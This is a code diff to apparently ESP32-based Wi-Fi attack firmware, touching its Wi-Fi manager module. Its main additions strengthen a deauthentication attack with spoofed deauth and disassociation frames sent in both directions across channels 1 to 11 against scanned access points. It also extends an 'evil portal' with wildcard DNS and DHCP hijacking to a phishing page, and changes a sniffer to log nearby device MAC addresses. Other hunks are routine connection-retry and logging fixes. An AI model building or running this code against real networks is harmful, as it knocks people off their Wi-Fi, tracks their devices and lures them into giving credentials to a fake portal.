@@ -31,16 +31,18 @@
 // Include Outside so we have access to the Terminal View Macro
 #include "managers/views/terminal_screen.h"
 
+
 #define MAX_DEVICES 255
 #define CHUNK_SIZE 8192
 #define MDNS_NAME_BUF_LEN 65
 #define ARP_DELAY_MS 500
+#define MAX_PACKETS_PER_SECOND 200
 
 uint16_t ap_count;
 wifi_ap_record_t* scanned_aps;
 const char *TAG = "WiFiManager";
 char* PORTALURL = "";
-char* DOMAIN = "";
+char* domain_str = "";
 EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
@@ -49,6 +51,8 @@ httpd_handle_t evilportal_server = NULL;
 dns_server_handle_t dns_handle;
 esp_netif_t* wifiAP;
 esp_netif_t* wifiSTA;
+static uint32_t last_packet_time = 0;
+static uint32_t packet_counter = 0;
 
 struct service_info {
     const char *query;
@@ -278,9 +282,7 @@ static void add_station_ap_pair(const uint8_t *station_mac, const uint8_t *ap_bs
         station_count++;
 
         // Print formatted MAC addresses
-        printf("Added station MAC: %02X:%02X:%02X:%02X:%02X:%02X -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
-            station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
-            ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]);
+        
     } else {
         printf("Station list is full, can't add more stations.\n");
     }
@@ -356,11 +358,10 @@ void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type)
     
     const uint8_t *src_mac = hdr->addr2;  // Station MAC
     const uint8_t *dest_mac = hdr->addr1; // AP BSSID
-
-
-    if (!station_exists(src_mac, dest_mac)) {
-        add_station_ap_pair(src_mac, dest_mac);
-    }
+    
+    printf("station MAC: %02X:%02X:%02X:%02X:%02X:%02X -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+            src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5],
+            dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5]);
 }
 
 esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *content_type) {
@@ -601,11 +602,8 @@ esp_err_t file_handler(httpd_req_t *req) {
 esp_err_t portal_handler(httpd_req_t *req) {
     printf("Client requested URL: %s\n", req->uri);
 
-    
-    const char *portal_url = PORTALURL;
 
-
-    esp_err_t err = stream_data_to_client(req, portal_url, "text/html");
+    esp_err_t err = stream_data_to_client(req, PORTALURL, "text/html");
     
     if (err != ESP_OK) {
         const char *err_msg = esp_err_to_name(err);
@@ -779,13 +777,13 @@ httpd_handle_t start_portal_webserver(void) {
     return evilportal_server;
 }
 
-void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password, const char* ap_ssid, const char* domain)
+esp_err_t wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password, const char* ap_ssid, const char* domain)
 {
 
     if (strlen(URL) > 0 && strlen(domain) > 0)
     {
         PORTALURL = URL;
-        DOMAIN = domain;
+        domain_str = domain;
     }
 
     ap_manager_stop_services();
@@ -847,28 +845,51 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
 
         start_portal_webserver();
 
+        // Configure DNS server to handle both regular and .local domains
         dns_server_config_t dns_config = {
-            .num_of_entries = 1,
+            .num_of_entries = 3,
             .item = {
                 {
                     .name = "*", 
+                    .if_key = NULL, 
+                    .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
+                },
+                {
+                    .name = "ghostesp", 
+                    .if_key = NULL, 
+                    .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
+                },
+                {
+                    .name = "ghostesp.local",
                     .if_key = NULL, 
                     .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1)} 
                 }
             }
         };
 
-        // Start the DNS server with the configured settings
+        // Start DNS server
         dns_handle = start_dns_server(&dns_config);
         if (dns_handle) {
-            printf("DNS server started, all requests will be redirected to 192.168.4.1\n");
+            ESP_LOGI(TAG, "DNS server started, handling all requests including ghostesp.local");
         } else {
-            printf("Failed to start DNS server\n");
+            ESP_LOGE(TAG, "Failed to start DNS server");
+            return ESP_FAIL;
         }
+
+        // Configure DHCP to offer our DNS server
+        esp_netif_dhcps_option(wifiAP, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, 
+                              &dhcps_dns_value, sizeof(dhcps_dns_value));
+
+        // Set DNS server info
+        esp_netif_dns_info_t dns_info = {
+            .ip.u_addr.ip4.addr = ESP_IP4TOADDR(192, 168, 4, 1),
+            .ip.type = ESP_IPADDR_TYPE_V4
+        };
+        esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dns_info);
     }
     else 
     {
-        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP) );
+        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
         strlcpy((char*)ap_config.sta.ssid, ap_ssid, sizeof(ap_config.sta.ssid));
         ap_config.ap.authmode = WIFI_AUTH_OPEN;
 
@@ -879,7 +900,7 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
         dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
         esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);
 
-        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config) );
+        ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config));
 
         ESP_ERROR_CHECK(esp_wifi_start());
 
@@ -904,6 +925,8 @@ void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const cha
             printf("Failed to start DNS server\n");
         }
     }
+
+    return ESP_OK;  // Add return value at the end
 }
 
 
@@ -939,18 +962,19 @@ void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(callback));
 
     printf("WiFi monitor mode started.\n");
-    TERMINAL_VIEW_ADD_TEXT("WiFi monitor mode started.");
+    TERMINAL_VIEW_ADD_TEXT("WiFi monitor mode started.\n");
 }
 
 void wifi_manager_stop_monitor_mode() {
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
-
     printf("WiFi monitor mode stopped.\n");
-    TERMINAL_VIEW_ADD_TEXT("WiFi monitor mode stopped.");
+    TERMINAL_VIEW_ADD_TEXT("WiFi monitor mode stopped.\n");
 }
 
-void wifi_manager_init() {
+void wifi_manager_init(void) {
 
+    esp_log_level_set("wifi", ESP_LOG_ERROR);  // Only show errors, not warnings
+    
     esp_wifi_set_ps(WIFI_PS_NONE);
 
     esp_err_t ret = nvs_flash_init();
@@ -1011,11 +1035,11 @@ void wifi_manager_init() {
 
 void wifi_manager_start_scan() {
     ap_manager_stop_services();
-    TERMINAL_VIEW_ADD_TEXT("Stopped AP Manager...");
+    TERMINAL_VIEW_ADD_TEXT("Stopped AP Manager...\n");
 
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
     ESP_ERROR_CHECK(esp_wifi_start());
-    TERMINAL_VIEW_ADD_TEXT("Set Wifi Modes...");
+    TERMINAL_VIEW_ADD_TEXT("Set Wifi Modes...\n");
 
     
     wifi_scan_config_t scan_config = {
@@ -1040,7 +1064,7 @@ void wifi_manager_start_scan() {
 
     if (err != ESP_OK) {
         printf("WiFi scan failed to start: %s", esp_err_to_name(err));
-        TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start");
+        TERMINAL_VIEW_ADD_TEXT("WiFi scan failed to start\n");
         return;
     }
 
@@ -1138,60 +1162,140 @@ void wifi_manager_list_stations() {
     }
 }   
 
+static bool check_packet_rate(void) {
+    uint32_t current_time = esp_timer_get_time() / 1000; // Convert to milliseconds
+    
+    // Reset counter every second
+    if (current_time - last_packet_time >= 1000) {
+        packet_counter = 0;
+        last_packet_time = current_time;
+        return true;
+    }
+    
+    // Check if we've exceeded our rate limit
+    if (packet_counter >= MAX_PACKETS_PER_SECOND) {
+        return false;
+    }
+    
+    packet_counter++;
+    return true;
+}
+
+static const uint8_t deauth_packet_template[26] = {
+    0xc0, 0x00,             // Frame Control
+    0x3a, 0x01,             // Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,         // Destination addr
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // Source addr
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // BSSID
+    0x00, 0x00,             // Sequence number
+    0x07, 0x00              // Reason code: Class 3 frame received from nonassociated STA
+};
+
+static const uint8_t disassoc_packet_template[26] = {
+    0xa0, 0x00,             // Frame Control (only first byte different)
+    0x3a, 0x01,             // Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,         // Destination addr
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // Source addr
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,         // BSSID
+    0x00, 0x00,             // Sequence number
+    0x07, 0x00              // Reason code
+};
+
 esp_err_t wifi_manager_broadcast_deauth(uint8_t bssid[6], int channel, uint8_t mac[6]) {
     esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     if (err != ESP_OK) {
         printf("Failed to set channel: %s\n", esp_err_to_name(err));
     }
 
-    uint8_t deauth_frame_default[26] = {
-        0xc0, 0x00, 0x3a, 0x01,
-        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0xf0, 0xff, 0x02, 0x00
-    };
+    // Create packets from templates
+    uint8_t deauth_frame[sizeof(deauth_packet_template)];
+    uint8_t disassoc_frame[sizeof(disassoc_packet_template)];
+    memcpy(deauth_frame, deauth_packet_template, sizeof(deauth_packet_template));
+    memcpy(disassoc_frame, disassoc_packet_template, sizeof(disassoc_packet_template));
 
-    
-    // Build AP source packet
-    deauth_frame_default[4] = mac[0];
-    deauth_frame_default[5] = mac[1];
-    deauth_frame_default[6] = mac[2];
-    deauth_frame_default[7] = mac[3];
-    deauth_frame_default[8] = mac[4];
-    deauth_frame_default[9] = mac[5];
-    
-    deauth_frame_default[10] = bssid[0];
-    deauth_frame_default[11] = bssid[1];
-    deauth_frame_default[12] = bssid[2];
-    deauth_frame_default[13] = bssid[3];
-    deauth_frame_default[14] = bssid[4];
-    deauth_frame_default[15] = bssid[5];
+    // Check if broadcast MAC
+    bool is_broadcast = true;
+    for (int i = 0; i < 6; i++) {
+        if (mac[i] != 0xFF) {
+            is_broadcast = false;
+            break;
+        }
+    }
 
-    deauth_frame_default[16] = bssid[0];
-    deauth_frame_default[17] = bssid[1];
-    deauth_frame_default[18] = bssid[2];
-    deauth_frame_default[19] = bssid[3];
-    deauth_frame_default[20] = bssid[4];
-    deauth_frame_default[21] = bssid[5]; 
-
+    // Direction 1: AP -> Station
+    // Set destination (target)
+    memcpy(&deauth_frame[4], mac, 6);
+    memcpy(&disassoc_frame[4], mac, 6);
     
-    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-    err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
-    if (err != ESP_OK) {
-        printf("Failed to send beacon frame: %s\n", esp_err_to_name(err));
-        return err;
+    // Set source and BSSID (AP)
+    memcpy(&deauth_frame[10], bssid, 6);
+    memcpy(&deauth_frame[16], bssid, 6);
+    memcpy(&disassoc_frame[10], bssid, 6);
+    memcpy(&disassoc_frame[16], bssid, 6);
+
+    // Add sequence number (random)
+    uint16_t seq = (esp_random() & 0xFFF) << 4;
+    deauth_frame[22] = seq & 0xFF;
+    deauth_frame[23] = (seq >> 8) & 0xFF;
+    disassoc_frame[22] = seq & 0xFF;
+    disassoc_frame[23] = (seq >> 8) & 0xFF;
+
+    // Send frames with rate limiting
+    if (check_packet_rate()) {
+        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+        }
+    }
+
+    // If not broadcast, send reverse direction
+    if (!is_broadcast) {
+        // Swap addresses for Station -> AP direction
+        memcpy(&deauth_frame[4], bssid, 6);      // Set destination as AP
+        memcpy(&deauth_frame[10], mac, 6);       // Set source as station
+        memcpy(&deauth_frame[16], mac, 6);       // Set BSSID as station
+        
+        memcpy(&disassoc_frame[4], bssid, 6);
+        memcpy(&disassoc_frame[10], mac, 6);
+        memcpy(&disassoc_frame[16], mac, 6);
+
+        // New sequence number for reverse direction
+        seq = (esp_random() & 0xFFF) << 4;
+        deauth_frame[22] = seq & 0xFF;
+        deauth_frame[23] = (seq >> 8) & 0xFF;
+        disassoc_frame[22] = seq & 0xFF;
+        disassoc_frame[23] = (seq >> 8) & 0xFF;
+
+        // Send reverse frames with rate limiting
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+        }
+        if (check_packet_rate()) {
+            esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+        }
     }
 
     return ESP_OK;
 }
 
 void wifi_deauth_task(void *param) {
-    const char *ssid = (const char *)param;
-
     if (ap_count == 0) {
         printf("No access points found\n");
+        printf("Please run 'scan -w' first to find targets\n");
+        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
+        TERMINAL_VIEW_ADD_TEXT("Please run 'scan -w' first to find targets\n");
         vTaskDelete(NULL);
         return;
     }
@@ -1199,52 +1303,49 @@ void wifi_deauth_task(void *param) {
     wifi_ap_record_t *ap_info = scanned_aps;
     if (ap_info == NULL) {
         printf("Failed to allocate memory for AP info\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to allocate memory for AP info\n");
         vTaskDelete(NULL);
         return;
     }
 
     while (1) {
-        if (strlen((const char*)selected_ap.ssid) > 0)
-        {
-            for (int i = 0; i < ap_count; i++)
-            {
-                if (strcmp((char*)ap_info[i].ssid, (char*)selected_ap.ssid) == 0)
-                {
-                    for (int y = 1; y < 12; y++)
-                    {
+        if (strlen((const char*)selected_ap.ssid) > 0) {
+            for (int i = 0; i < ap_count; i++) {
+                if (strcmp((char*)ap_info[i].ssid, (char*)selected_ap.ssid) == 0) {
+                    for (int y = 1; y < 12; y++) {
                         uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                         wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                        vTaskDelay(10 / portTICK_PERIOD_MS); // Lowest Delay before out of memory occurs
+                        // Increase delay to 50ms
+                        vTaskDelay(pdMS_TO_TICKS(50));
                     }
                 }
             }
-        }
-        else 
-        {
-            for (int i = 0; i < ap_count; i++)
-            {
-                for (int y = 1; y < 12; y++)
-                {
+        } else {
+            for (int i = 0; i < ap_count; i++) {
+                for (int y = 1; y < 12; y++) {
                     uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    vTaskDelay(10 / portTICK_PERIOD_MS); // Lowest Delay before out of memory occurs
+                    // Increase delay to 50ms
+                    vTaskDelay(pdMS_TO_TICKS(50));
                 }
             }
         }
+        // Add a small delay between iterations
+        vTaskDelay(pdMS_TO_TICKS(100));
     }
 }
 
 
-void wifi_manager_start_deauth()
-{
+void wifi_manager_start_deauth() {
     if (!beacon_task_running) {
         printf("Starting deauth transmission...\n");
         TERMINAL_VIEW_ADD_TEXT("Starting deauth transmission...\n");
         ap_manager_stop_services();
-        ESP_ERROR_CHECK(esp_wifi_start());
-        xTaskCreate(wifi_deauth_task, "deauth_task", 2048, NULL, 5, &deauth_task_handle);
+        esp_wifi_start();
+        // Increase stack size to 4096
+        xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
         beacon_task_running = true;
-        rgb_manager_set_color(&rgb_manager, 0, 255, 22, 23, false);
+        rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
     } else {
         printf("Deauth transmission already running.\n");
         TERMINAL_VIEW_ADD_TEXT("Deauth transmission already running.\n");
@@ -1757,13 +1858,26 @@ void wifi_manager_stop_beacon()
     if (beacon_task_running) {
         printf("Stopping beacon transmission...\n");
         TERMINAL_VIEW_ADD_TEXT("Stopping beacon transmission...\n");
+        
+        // Stop the beacon task
         if (beacon_task_handle != NULL) {
             vTaskDelete(beacon_task_handle);
             beacon_task_handle = NULL;
             beacon_task_running = false;
         }
+        
+        // Turn off RGB indicator
         rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
-        ap_manager_start_services();
+        
+        // Stop WiFi completely
+        esp_wifi_stop();
+        vTaskDelay(pdMS_TO_TICKS(500)); // Give some time for WiFi to stop
+        
+        // Reset WiFi mode
+        esp_wifi_set_mode(WIFI_MODE_AP);
+        
+        // Now restart services
+        ap_manager_init();
     } else {
         printf("No beacon transmission is running.\n");
         TERMINAL_VIEW_ADD_TEXT("No beacon transmission is running.\n");
@@ -1842,12 +1956,9 @@ void wifi_manager_start_ip_lookup()
     TERMINAL_VIEW_ADD_TEXT("IP Scan Done...\n");
 }
 
-void wifi_manager_connect_wifi(const char* ssid, const char* password)
-{ 
+void wifi_manager_connect_wifi(const char* ssid, const char* password) { 
     wifi_config_t wifi_config = {
         .sta = {
-            .ssid = "",
-            .password = "",
             .threshold.authmode = strlen(password) > 8 ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN,
             .pmf_cfg = {
                 .capable = true,
@@ -1856,51 +1967,87 @@ void wifi_manager_connect_wifi(const char* ssid, const char* password)
         },
     };
 
+    // Copy SSID and password safely
+    strlcpy((char*)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid));
+    strlcpy((char*)wifi_config.sta.password, password, sizeof(wifi_config.sta.password));
+
+    // Ensure we're disconnected before starting
+    esp_wifi_disconnect();
+    vTaskDelay(pdMS_TO_TICKS(500));  // Increased delay to ensure disconnect completes
+
+    // Clear any previous connection state
+    xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
+    
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
-
-    // Copy SSID and password into Wi-Fi config
-    strncpy((char*)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid) - 1);
-    strncpy((char*)wifi_config.sta.password, password, sizeof(wifi_config.sta.password) - 1);
-
-    // Apply the Wi-Fi configuration and start Wi-Fi
     ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config));
     ESP_ERROR_CHECK(esp_wifi_start());
 
-    // Attempt to connect to the Wi-Fi network
     int retry_count = 0;
-    while (retry_count < 5) {
-        printf("Attempting to connect to Wi-Fi (Attempt %d/%d)...\n", retry_count + 1, 5);
-        TERMINAL_VIEW_ADD_TEXT("Attempting to connect to Wi-Fi (Attempt %d/%d)...\n", retry_count + 1, 5);
-        
-        int ret = esp_wifi_connect();
+    const int max_retries = 5;
+    bool connected = false;
+
+    while (retry_count < max_retries && !connected) {
+        printf("Attempting to connect to Wi-Fi (Attempt %d/%d)...\n", retry_count + 1, max_retries);
+        TERMINAL_VIEW_ADD_TEXT("Attempting to connect to Wi-Fi (Attempt %d/%d)...\n", retry_count + 1, max_retries);
+
+        esp_err_t ret = esp_wifi_connect();
+        if (ret == ESP_ERR_WIFI_CONN) {
+            // If already connecting, wait for result instead of treating as error
+            printf("Connection already in progress, waiting for result...\n");
+            TERMINAL_VIEW_ADD_TEXT("Connection already in progress, waiting for result...\n");
+            ret = ESP_OK;
+        }
+
         if (ret == ESP_OK) {
-            printf("Connecting...\n");
-            TERMINAL_VIEW_ADD_TEXT("Connecting...\n");
-            vTaskDelay(5000 / portTICK_PERIOD_MS);  // Wait for 5 seconds
-            
-            // Check if connected to the AP
-            wifi_ap_record_t ap_info;
-            if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
-                printf("Successfully connected to Wi-Fi network: %s\n", ap_info.ssid);
-                TERMINAL_VIEW_ADD_TEXT("Successfully connected to Wi-Fi network: %s\n", ap_info.ssid);
-                break;
-            } else {
-                printf("Connection failed or timed out, retrying...\n");
+            // Wait for connection event with timeout
+            EventBits_t bits = xEventGroupWaitBits(wifi_event_group,
+                                                 WIFI_CONNECTED_BIT,
+                                                 pdFALSE,
+                                                 pdTRUE,
+                                                 pdMS_TO_TICKS(8000)); // Increased to 8 second timeout
+
+            if (bits & WIFI_CONNECTED_BIT) {
+                // Double check connection status
+                wifi_ap_record_t ap_info;
+                if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
+                    printf("Successfully connected to Wi-Fi network: %s\n", ap_info.ssid);
+                    TERMINAL_VIEW_ADD_TEXT("Successfully connected to Wi-Fi network: %s\n", ap_info.ssid);
+                    connected = true;
+                    break;
+                }
             }
         } else {
-            printf("esp_wifi_connect() failed: %s\n", esp_err_to_name(ret));
-            if (ret == ESP_ERR_WIFI_CONN) {
-                printf("Already connected or connection in progress.\n");
-            }
+            // Only treat as failed attempt if it's not ESP_ERR_WIFI_CONN
+            printf("Connection attempt %d failed: %s\n", retry_count + 1, esp_err_to_name(ret));
+            TERMINAL_VIEW_ADD_TEXT("Connection attempt %d failed\n", retry_count + 1);
         }
-        retry_count++;
+
+        // If we get here and not connected, prepare for retry
+        if (!connected) {
+            esp_wifi_disconnect();
+            vTaskDelay(pdMS_TO_TICKS(1000));  // 1 second delay between retries
+            retry_count++;
+        }
     }
 
-    // Final status after retries
-    if (retry_count == 5) {
-        TERMINAL_VIEW_ADD_TEXT("Failed to connect to Wi-Fi after %d attempts\n", 5);
-        printf("Failed to connect to Wi-Fi after %d attempts\n", 5);
+    if (!connected) {
+        TERMINAL_VIEW_ADD_TEXT("Failed to connect to Wi-Fi after %d attempts\n", max_retries);
+        printf("Failed to connect to Wi-Fi after %d attempts\n", max_retries);
+        // Clean up
+        esp_wifi_disconnect();
+    } else {
+        // Get and display IP info
+        esp_netif_ip_info_t ip_info;
+        if (esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"), &ip_info) == ESP_OK) {
+            printf("IP Address: " IPSTR "\n", IP2STR(&ip_info.ip));
+            printf("Subnet Mask: " IPSTR "\n", IP2STR(&ip_info.netmask));
+            printf("Gateway: " IPSTR "\n", IP2STR(&ip_info.gw));
+            
+            TERMINAL_VIEW_ADD_TEXT("IP Address: " IPSTR "\n", IP2STR(&ip_info.ip));
+            TERMINAL_VIEW_ADD_TEXT("Connection successful!\n");
+        }
     }
+
 }
 
 void wifi_beacon_task(void *param) {
